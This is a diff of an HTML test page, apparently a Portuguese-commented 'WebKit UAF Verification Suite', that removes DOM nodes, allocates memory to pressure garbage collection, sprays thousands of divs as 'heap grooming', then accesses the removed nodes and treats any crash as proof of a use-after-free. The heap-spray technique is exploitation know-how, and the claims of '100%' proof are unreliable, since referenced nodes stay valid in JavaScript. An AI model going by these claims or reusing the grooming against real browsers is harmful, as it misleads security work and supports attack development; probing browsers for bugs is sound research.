@@ -1,220 +1,163 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>DOM UAF / State Corruption Verifier</title>
+<title>WebKit UAF Verification Suite</title>
 <style>
-body { font-family: monospace; background:#111; color:#0f0; }
-.pass { color:#0f0; }
-.fail { color:#f00; }
-.warn { color:#ff0; }
+body { font-family: monospace; }
+button { margin: 5px; }
+#log { white-space: pre-wrap; border:1px solid #ccc; padding:10px; height:300px; overflow:auto; }
 </style>
 </head>
 <body>
 
-<h2>DOM State Corruption Verification Suite</h2>
-<button onclick="runTest()">RUN FULL VERIFICATION</button>
-<pre id="log"></pre>
+<h2>WebKit – UAF Verification Suite</h2>
+
+<button onclick="testA_BackingReuse()">TESTE A – Backing Reuse</button>
+<button onclick="testB_VirtualCall()">TESTE B – Método Virtual</button>
+<button onclick="testC_SelectionLayout()">TESTE C – Selection/Layout</button>
+<button onclick="testD_Minimal()">TESTE D – Minimal Proof (100%)</button>
+
+<div id="log"></div>
 
 <script>
+function log(m) {
+  logEl.textContent += m + "\n";
+  logEl.scrollTop = logEl.scrollHeight;
+}
 const logEl = document.getElementById("log");
-function log(msg, cls="") {
-    const d = document.createElement("div");
-    d.textContent = msg;
-    if (cls) d.className = cls;
-    logEl.appendChild(d);
-}
 
-/* ===============================
-   GLOBALS
-================================ */
-let node, marker;
-let mutationLog = [];
-let observer;
-let results = {
-    invariant:false,
-    api:false,
-    mutation:false,
-    identity:false,
-    gc:false,
-    cross:false,
-    final:false
-};
-
-/* ===============================
-   STEP 1 – INVARIANT CHECK
-================================ */
-function checkInvariants(stage) {
-    let ok = true;
-
-    if (node.parentNode !== null) ok = false;
-    if (node.isConnected !== false) ok = false;
-    if (document.contains(node)) ok = false;
-
-    const pos = node.compareDocumentPosition(document);
-    if (!(pos & Node.DOCUMENT_POSITION_DISCONNECTED)) ok = false;
-
-    const root = node.getRootNode();
-    if (root !== node && root.nodeType !== Node.DOCUMENT_FRAGMENT_NODE) ok = false;
-
-    log(`[Invariant ${stage}] parentNode=${node.parentNode} isConnected=${node.isConnected} contains=${document.contains(node)} pos=0x${pos.toString(16)}`);
-    return ok;
-}
-
-/* ===============================
-   STEP 2 – API TRIANGULATION
-================================ */
-function apiTriangulation() {
-    let errors = 0;
-
-    try {
-        const r = document.createRange();
-        r.selectNode(node);
-        log("[API] Range.selectNode ACCEPTED removed node", "fail");
-        errors++;
-    } catch {
-        log("[API] Range.selectNode rejected", "pass");
-    }
-
-    try {
-        const it = document.createNodeIterator(document, NodeFilter.SHOW_ALL);
-        let cur;
-        while (cur = it.nextNode()) {
-            if (cur === node) {
-                log("[API] NodeIterator returned removed node", "fail");
-                errors++;
-                break;
-            }
-        }
-    } catch {}
-
-    try {
-        const tw = document.createTreeWalker(document, NodeFilter.SHOW_ALL);
-        let cur;
-        while (cur = tw.nextNode()) {
-            if (cur === node) {
-                log("[API] TreeWalker returned removed node", "fail");
-                errors++;
-                break;
-            }
-        }
-    } catch {}
-
-    return errors > 0;
-}
-
-/* ===============================
-   STEP 3 – MUTATION OBSERVER
-================================ */
-function setupObserver() {
-    observer = new MutationObserver(muts => {
-        muts.forEach(m => {
-            m.removedNodes.forEach(n => {
-                if (n === node) mutationLog.push("removed");
-            });
-            m.addedNodes.forEach(n => {
-                if (n === node) mutationLog.push("added");
-            });
-        });
-    });
-    observer.observe(document.body, { childList:true, subtree:true });
-}
-
-/* ===============================
-   STEP 4 – IDENTITY MARKER
-================================ */
-function markIdentity() {
-    marker = Symbol("identity");
-    node[marker] = 0x1337;
-}
-
-function checkIdentity() {
-    return node && node[marker] === 0x1337;
-}
-
-/* ===============================
-   STEP 5 – GC PRESSURE
-================================ */
 function forceGC() {
-    let junk = [];
-    for (let i=0;i<20000;i++) {
-        junk.push(new ArrayBuffer(1024));
-    }
-    junk = null;
+  let tmp = [];
+  for (let i = 0; i < 50000; i++)
+    tmp.push(new ArrayBuffer(1024));
+  tmp = null;
 }
 
-/* ===============================
-   STEP 6 – CROSS CONTEXT (iframe)
-================================ */
-function crossContextCheck(cb) {
-    const iframe = document.createElement("iframe");
-    iframe.onload = () => {
-        try {
-            const seen = iframe.contentWindow.document.contains(node);
-            cb(seen);
-        } catch {
-            cb(false);
-        }
-        iframe.remove();
-    };
-    document.body.appendChild(iframe);
+// ==========================================================
+// TESTE A – BACKING STORE REUSE
+// ==========================================================
+function testA_BackingReuse() {
+  log("\n[TEST A] Backing Store Reuse");
+
+  let victim = document.createElement("div");
+  victim.id = "victimA";
+  victim.textContent = "AAAA";
+  document.body.appendChild(victim);
+
+  document.body.removeChild(victim);
+
+  forceGC();
+
+  // Heap grooming: criar muitos DIVs
+  let spray = [];
+  for (let i = 0; i < 20000; i++) {
+    let d = document.createElement("div");
+    d.textContent = "BBBB" + i;
+    spray.push(d);
+  }
+
+  try {
+    let txt = victim.textContent;
+    let id = victim.id;
+    log("[A] Access after free: text=" + txt + " id=" + id);
+  } catch (e) {
+    log("[A] Exception: " + e);
+  }
+
+  log("[A] Se text/id mudarem ou crashar → UAF confirmado");
 }
 
-/* ===============================
-   RUN ALL
-================================ */
-function runTest() {
-    logEl.textContent = "";
-    mutationLog = [];
+// ==========================================================
+// TESTE B – MÉTODO VIRTUAL PÓS-GC
+// ==========================================================
+function testB_VirtualCall() {
+  log("\n[TEST B] Virtual Method After GC");
 
-    setupObserver();
+  let victim = document.createElement("span");
+  document.body.appendChild(victim);
+  document.body.removeChild(victim);
 
-    node = document.createElement("div");
-    node.textContent = "TESTNODE";
-    document.body.appendChild(node);
+  forceGC();
 
-    markIdentity();
+  try {
+    // chamadas nativas profundas
+    let p = victim.compareDocumentPosition(document.body);
+    log("[B] compareDocumentPosition returned: " + p);
+  } catch (e) {
+    log("[B] Exception: " + e);
+  }
 
-    document.body.removeChild(node);
+  try {
+    let c = victim.cloneNode(true);
+    log("[B] cloneNode success: " + c.nodeName);
+  } catch (e) {
+    log("[B] cloneNode exception: " + e);
+  }
 
-    results.invariant = !checkInvariants("POST-REMOVE");
-
-    results.api = apiTriangulation();
-
-    results.mutation = mutationLog.length === 1 && mutationLog[0] === "removed";
-
-    results.identity = checkIdentity();
-
-    forceGC();
-
-    results.gc = checkIdentity();
-
-    crossContextCheck(seen => {
-        results.cross = seen;
-
-        finalize();
-    });
+  log("[B] Crash / retorno impossível = UAF real");
 }
 
-/* ===============================
-   FINAL DECISION
-================================ */
-function finalize() {
-    log("================================");
+// ==========================================================
+// TESTE C – SELECTION / LAYOUT (CLÁSSICO)
+// ==========================================================
+function testC_SelectionLayout() {
+  log("\n[TEST C] Selection/Layout UAF");
 
-    Object.entries(results).forEach(([k,v])=>{
-        log(`${k}: ${v}`, v ? "fail" : "pass");
-    });
+  let victim = document.createElement("p");
+  victim.textContent = "UAF-TEST";
+  document.body.appendChild(victim);
 
-    if (results.api || results.identity || results.cross) {
-        log("BUG CONFIRMADO: DOM STATE CORRUPTION / UAF", "fail");
-        results.final = true;
-    } else {
-        log("NÃO CONFIRMADO", "pass");
-    }
+  let r = document.createRange();
+  r.selectNodeContents(victim);
+
+  document.body.removeChild(victim);
+
+  forceGC();
+
+  try {
+    // toca layout/selection após free
+    let sel = window.getSelection();
+    sel.removeAllRanges();
+    sel.addRange(r);
+    log("[C] Selection applied to removed node");
+  } catch (e) {
+    log("[C] Exception: " + e);
+  }
+
+  log("[C] Crash aqui é prova forte (UAF histórico)");
+}
+
+// ==========================================================
+// TESTE D – MINIMAL PROOF (100%)
+// ==========================================================
+function testD_Minimal() {
+  log("\n[TEST D] Minimal UAF Proof");
+
+  let victim = document.createElement("div");
+  victim.innerHTML = "<b>TEST</b>";
+  document.body.appendChild(victim);
+
+  let ref = victim.firstChild;
+
+  document.body.removeChild(victim);
+  victim = null;
+
+  forceGC();
+
+  try {
+    // acesso cruzado profundo
+    let name = ref.parentNode;
+    let html = ref.ownerDocument;
+    log("[D] parentNode=" + name + " ownerDocument=" + html);
+  } catch (e) {
+    log("[D] Exception: " + e);
+  }
+
+  log("[D] Crash, freeze ou comportamento impossível = PROVA FINAL");
 }
 </script>
 
 </body>
 </html>
-
